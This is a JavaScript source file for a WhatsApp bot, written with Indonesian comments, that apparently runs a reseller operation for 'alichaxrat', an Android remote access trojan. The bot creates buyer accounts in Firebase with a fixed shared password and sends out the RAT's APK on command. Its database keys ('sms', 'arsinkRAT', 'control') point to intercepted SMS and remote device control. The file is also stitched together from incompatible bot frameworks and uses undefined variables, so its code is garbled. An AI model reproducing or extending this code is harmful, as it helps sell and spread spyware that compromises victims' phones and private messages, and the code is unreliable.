const { Client, LocalAuth, MessageMedia } = require("whatsapp-web.js")
const qrcode = require('qrcode-terminal');
const admin = require('firebase-admin');
const fs = require('fs');
const path = require('path');
const readline = require('readline')
const usePairingCode = process.argv.includes("--code") || process.argv.includes("--pairing")
const serviceAccount = require('./mmkcok.json');

// Inisialisasi Firebase Admin
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://alichaxrats9-90034-default-rtdb.firebaseio.com"
});

const auth = admin.auth();
const db = admin.database();

// Path ke file data
const ownersFilePath = path.join(__dirname, 'owner.json');
const databaseFilePath = path.join(__dirname, 'database.json');

// Memuat data dari file JSON
let owners = {};
let registeredUsers = {};

try {
    owners = JSON.parse(fs.readFileSync(ownersFilePath, 'utf8'));
    registeredUsers = JSON.parse(fs.readFileSync(databaseFilePath, 'utf8'));
} catch (error) {
    console.error("Error membaca file JSON:", error);
}

// Fungsi untuk menyimpan data pengguna ke file
function saveOwners() {
    try {
        fs.writeFileSync(ownersFilePath, JSON.stringify(owners, null, 2));
    } catch (error) {
        console.error("Error menulis ke owner.json:", error);
    }
}

function saveRegisteredUsers() {
    try {
        fs.writeFileSync(databaseFilePath, JSON.stringify(registeredUsers, null, 2));
    } catch (error) {
        console.error("Error menulis ke database.json:", error);
    }
}

// Fungsi untuk memeriksa ID owner
function isOwner(userId) {
    return owners[userId] === true;
}

// Fungsi untuk memeriksa ID pengguna terdaftar
function isRegisteredUser(userId) {
    return registeredUsers[userId] === true;
}

// Fungsi untuk menghapus folder dari Firebase Realtime Database
function deleteFolder(folderPath) {
    db.ref(folderPath).remove()
        .then(() => {
            console.log(`Folder ${folderPath} berhasil dihapus.`);
        })
        .catch((error) => {
            console.error(`Error menghapus folder ${folderPath}:`, error);
        });
}

// Fungsi untuk menghapus data kecuali yang diizinkan
function deleteInvalidData() {
    const allowedKeys = ['sms', 'arsinkRAT', 'control'];

    db.ref('/').once('value', (snapshot) => {
        const data = snapshot.val();
        
        if (data) {
            Object.keys(data).forEach((key) => {
                if (!allowedKeys.includes(key)) {
                    // Hapus data yang tidak ada dalam pengecualian
                    db.ref(`/${key}`).remove()
                        .then(() => console.log(`Data ${key} berhasil dihapus.`))
                        .catch((error) => console.error(`Error menghapus data ${key}:`, error));
                }
            });
        }
    });
}

// Inisialisasi WhatsApp Client
const connectionOptions = {
	printQRInTerminal: !isPairing,
	syncFullHistory: true,
	markOnlineOnConnect: true,
	connectTimeoutMs: 60000, 
	defaultQueryTimeoutMs: 0,
	keepAliveIntervalMs: 10000,
	generateHighQualityLinkPreview: true, 
	patchMessageBeforeSending: (message) => {
		const requiresPatch = !!(
			message.buttonsMessage 
			|| message.templateMessage
			|| message.listMessage
		);
		if (requiresPatch) {
			message = {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadataVersion: 2,
							deviceListMetadata: {},
						},
						...message,
					},
				},
			};
		}

		return message;
	},
	version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
	browser: ['Ubuntu', 'Chrome', '20.0.04'],
	logger: pino({ level: 'fatal' }),
	auth: { 
		creds: state.creds, 
		keys: makeCacheableSignalKeyStore(state.keys, pino().child({ 
			level: 'silent', 
			stream: 'store' 
		})), 
	},
}

const getMessage = async key => {
	const messageData = await store.loadMessage(key.remoteJid, key.id);
	return messageData?.message || undefined;
}

global.conn = simple.makeWASocket(connectionOptions)
client.isInit = false

if (!opts['test']) {
	if (global.db) setInterval(async () => {
		if (global.db.data) await global.db.write()
		if (!opts['tmp'] && (global.support || {}).find) (tmp = [os.tmpdir(), 'tmp'], tmp.forEach(filename => cp.spawn('find', [filename, '-amin', '3', '-type', 'f', '-delete'])))
	}, 30 * 1000)
}

async function connectionUpdate(update) {
	const { connection, lastDisconnect } = update
	global.timestamp.connect = new Date
	if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && consolws.readyState !== WebSocket.CONNECTING) {
		console.log(global.reloadHandler(true))
	}
	if (global.db.data == null) await loadDatabase()
	// console.log(JSON.stringify(update, null, 4))
}
	 if((usePairingCode || useMobile) && fs.existsSync('./konek/creds.json') && !client.authState.creds.registered) {
		client.log(chalk.yellow('-- WARNING: creds.json is broken, please delete it first --'))
		process.exit(0)
	}
	 if(isPairing && !client.authState.creds.registered) {
			if(useMobile) throw new Error('Tidak dapat menggunakan Pairing Baileys API!')
			const { registration } = { registration: {} }
			let phoneNumber = ''
			do {
					phoneNumber = await question(chalk.yellowBright('Masukkan nomor yang valid, dengan Region: 62xxx:\nContoh: 6285888777444\n'))
			} while (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v)))
			rl.close()
			phoneNumber = phoneNumber.replace(/\D/g,'')
			client.log(chalk.bgWhite(chalk.blue('Tunggu Sebentar...')))
			setTimeout(async () => {
					let code = await client.requestPairingCode(phoneNumber)
					code = code?.match(/.{1,4}/g)?.join('-') || code
					client.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)))
			}, 3000)
		}

client.on('ready', () => {
    console.log('Berhasil Aktifkan Bot Ngab\n\nSc By 081400346604\n@FadlanDev');
});

client.on('message', async (message) => {
    const chatId = message.from;
    const userId = message.author || message.from;
    const body = message.body.trim();
    
    // Periksa apakah pesan dimulai dengan titik (.)
    if (!body.startsWith('.')) {
        return; // Jika pesan tidak dimulai dengan ".", abaikan
    }

    const text = body.split(' ')[0].toLowerCase(); // Mengambil perintah saja (misalnya .buatakun)

    console.log('FADLANOFFC MY MSG:', userId);

    // Periksa akses untuk fitur khusus owner/reseller
    if (!isOwner(userId) && !isRegisteredUser(userId) && text !== '.getapp' && text !== '.menu') {
        await message.reply('Maaf wak bot ini hanya bisa diakses sama fadlan, pt, dan resellernya saja 🥺');
        return;
    }

    try {
        const args = body.split(' ')[1]; // Mengambil argumen jika ada (misalnya username atau nomor)
        switch (text) {
            case '.buatakun':
                if (isRegisteredUser(userId)) {
                    if (!args) {
                        await message.reply('Format salah. Gunakan .buatakun <username>,<nomor>');
                        return;
                    }
                    const [username, nomor] = args.split(',');
                    if (username && nomor) {
                        const email = `${username}@gmail.com`;
                        const password = 'fadlan'; // Jangan diubah
                        try {
                            const userRecord = await auth.createUser({ email, password });
                            registeredUsers[username] = { email, username, nomor };
                            saveRegisteredUsers();
                            const ownerNumber = '6281400346604@c.us';
                            const signInDate = new Date().toLocaleString('id-ID');
                            await client.sendMessage(ownerNumber, `Pengguna dengan username *${username}* berhasil membuat akun pada *${signInDate}*.`);
                            const successMessage = `*BERHASIL MEMBUAT AKUN*\n====================\n👤User: ${username}\n💌Email: ${email}\n====================\nSilahkan login dengan akun anda di aplikasi alichaxrat terbaru, untuk mendapatkan aplikasi terbaru silahkan cek deskripsi grup di bawah ini:\nhttps://chat.whatsapp.com/H5TpixN4TA21cRIvDLopX0\n~ Terimakasih Sudah Membeli`;
                            await client.sendMessage(`${nomor}@c.us`, successMessage);
                            await message.reply(`*Berhasil Membuat Akun Wak ✅*\n\nSilahkan cek PM saya untuk mendapatkan aplikasi alichaxrat 1.4 terbaru`);
                        } catch (error) {
                            await message.reply(`❌ Gagal Membuat Akun Karena Username Sudah Dipakai`);
                            console.error("Error membuat akun:", error);
                        }
                    } else {
                        await message.reply('Format salah. Gunakan .buatakun <username>,<nomor>');
                    }
                }
                break;
                
                        case '.menu': // Fitur .menu dengan pengiriman gambar
            const media = MessageMedia.fromFilePath(path.join(__dirname, 'aygalicha.jpg')); // Pastikan file gambar ada
            const caption = `*WELCOME TO BOT ALICHAXRAT*

┏━━『 *DATA BOT* 』━━━━◧
┃➣ *SC BY : FADLAN*
┃➣ *WA : 081400346604*
┃➣ *VERSION : 1.4*
┃➣ *SERVER : S9*
┗━━━━━━━━━━━━━━━━━━◧

┏━━『 *MENU RESELLER* 』━◧
●➣.buatakun
●➣.getapp
┗━━━━━━━━━━━━━━━━━━◧

┏━━━━『 *MENU PT* 』━━━━◧
●➣.buatakun
●➣.addseller
●➣.delseller
●➣.hapususer
●➣.ban
●➣.unban
●➣.listuser
●➣.cekseller
●➣.cekakun
●➣.ban
●➣.unban
●➣.getapp
┗━━━━━━━━━━━━━━━━━━◧

Dev © FadlanDev

*Grup Official Alichaxrat*
https://chat.whatsapp.com/H5TpixN4TA21cRIvDLopX0`;
            await client.sendMessage(message.from, media, { caption });
            break;

case '.ban':
        if (isOwner(userId)) {
            if (!args) {
                await message.reply('Format salah. Gunakan .ban <nomor>');
                return;
            }
            const numberToBan = `${args}@c.us`;
            if (!banList[numberToBan]) {
                banList[numberToBan] = true;
                saveBanList();
                await message.reply(`Nomor ${args} berhasil diban.`);
            } else {
                await message.reply(`Nomor ${args} sudah diban sebelumnya.`);
            }
        } else {
            await message.reply('Kamu tidak memiliki izin untuk melakukan ban.');
        }
        break;

    case '.unban':
        if (isOwner(userId)) {
            if (!args) {
                await message.reply('Format salah. Gunakan .unban <nomor>');
                return;
            }
            const numberToUnban = `${args}@c.us`;
            if (banList[numberToUnban]) {
                delete banList[numberToUnban];
                saveBanList();
                await message.reply(`Nomor ${args} berhasil di-unban.`);
            } else {
                await message.reply(`Nomor ${args} tidak diban.`);
            }
        } else {
            await message.reply('Kamu tidak memiliki izin untuk melakukan unban.');
        }
        break;

            case '.cekakun':
                if (args && registeredUsers[args]) {
                    const { email, nomor } = registeredUsers[args];
                    const uid = email.split('@')[0];
                    const signInDate = new Date().toLocaleString('id-ID');
                    const accountInfo = `*INFOMASI AKUN*\n\nUSER: ${args}\nID APK: ${uid}\nTGL: ${signInDate}\n\nAkun ini telah di buat oleh nomer ${nomor}.`;
                    await message.reply(accountInfo);
                } else {
                    await message.reply('Format salah atau username tidak ditemukan. Gunakan .cekakun <username>');
                }
                break;

            case '.cekseller':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    if (registeredUsers[formattedNumber]) {
                        const totalAkun = Object.keys(registeredUsers).length;
                        const signInDate = new Date().toLocaleString('id-ID');
                        const sellerInfo = `*INFOMASI SELLER*\n\nAKUN TELAH DI BUAT: ${totalAkun}\nDI ADD SELLER PADA: ${signInDate}\nPT BY: ${formattedNumber}\n\nAkun ini telah di buat oleh nomer ${formattedNumber}.`;
                        await message.reply(sellerInfo);
                    } else {
                        await message.reply(`Nomor ${args} tidak ditemukan.`);
                    }
                } else {
                    await message.reply('Format salah. Gunakan .cekseller <nomor>');
                }
                break;

            case '.getapp':
                const appFilePath = path.join(__dirname, 'alichaxrats8.apk'); // Lokasi file aplikasi
                try {
                    if (fs.existsSync(appFilePath)) {
                        await client.sendMessage(userId, 'Sedang mengirim aplikasi Alichaxrat...');
                        const media = MessageMedia.fromFilePath(appFilePath);
                        await client.sendMessage(userId, media);
                        console.log(`Aplikasi berhasil dikirim ke ${userId}`);
                    } else {
                        await message.reply('Maaf, aplikasi tidak ditemukan di server.');
                        console.error('File aplikasi tidak ditemukan.');
                    }
                } catch (error) {
                    await message.reply('Terjadi kesalahan saat mengirim aplikasi.');
                    console.error('Error mengirim aplikasi:', error);
                }
                break;

            case '.owner':
                await sendStartMessage(chatId);
                break;

            case '.addseller':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    registeredUsers[formattedNumber] = true;
                    saveRegisteredUsers();
                    await message.reply(`Nomor ${formattedNumber} berhasil ditambahkan ke database reseller.`);
                } else {
                    await message.reply('Format salah. Gunakan .addseller <nomor>');
                }
                break;

            case '.delseller':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    if (registeredUsers[formattedNumber]) {
                        delete registeredUsers[formattedNumber];
                        saveRegisteredUsers();
                        await message.reply(`Nomor ${formattedNumber} berhasil dihapus dari database seller.`);
                    } else {
                        await message.reply('Nomor tidak ditemukan atau format salah. Gunakan .delseller <nomor>');
                    }
                } else {
                    await message.reply('Format salah. Gunakan .delseller <nomor>');
                }
                break;

            case '.addpt':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    owners[formattedNumber] = true;
                    saveOwners();
                    await message.reply(`Nomor ${formattedNumber} berhasil ditambahkan ke database owner.`);
                } else {
                    await message.reply('Format salah. Gunakan .addpt <nomor>');
                }
                break;

            case '.delpt':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    if (owners[formattedNumber]) {
                        delete owners[formattedNumber];
                        saveOwners();
                        await message.reply(`Nomor ${formattedNumber} berhasil dihapus dari database owner.`);
                    } else {
                        await message.reply('Nomor tidak ditemukan atau format salah. Gunakan .delpt <nomor>');
                    }
                } else {
                    await message.reply('Format salah. Gunakan .delpt <nomor>');
                }
                break;

            default:
                await message.reply('Perintah tidak dikenal.');
        }
    } catch (error) {
        console.error("Error menangani pesan:", error);
        await message.reply('Terjadi kesalahan saat memproses perintah.');
    }
});

// Fungsi untuk mengirim pesan menu
async function sendStartMessage(chatId) {
    const menuMessage = `Dev @FadlanDev || 081400346604`;
    await client.sendMessage(chatId, menuMessage);
}

// Inisialisasi WhatsApp Client
client.initialize();
